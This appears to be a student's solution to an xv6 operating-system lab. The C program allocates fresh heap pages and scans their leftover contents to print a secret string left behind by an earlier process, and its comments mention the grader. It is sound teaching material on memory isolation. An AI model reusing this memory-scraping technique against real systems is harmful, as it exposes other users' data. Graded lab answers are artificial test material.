#include "kernel/types.h"
#include "user/user.h"

int isalnum(char c) {
    return (c >= '0' && c <= '9') ||
           (c >= 'a' && c <= 'z') ||
           (c >= 'A' && c <= 'Z');
}

int main() {
    // 分配足够大的内存（例如 4 页），增加找到残留数据的概率
    char *p = sbrk(4096 * 4);
    if (p == (char*)-1) {
        fprintf(2, "sbrk failed\n");
        exit(1);
    }
    // 扫描这 4 页，寻找连续的字母数字串（长度至少 4）
    for (int i = 0; i < 4096 * 4; i++) {
        if (isalnum(p[i])) {
            int j = i;
            while (j < 4096 * 4 && isalnum(p[j])) j++;
            if (j - i >= 4) {   // 秘密长度通常 >= 4
                printf("%.*s\n", j - i, p + i);
                exit(0);
            }
            i = j;
        }
    }
    // 如果未找到，退出（评分程序会运行两次）
    exit(0);
}
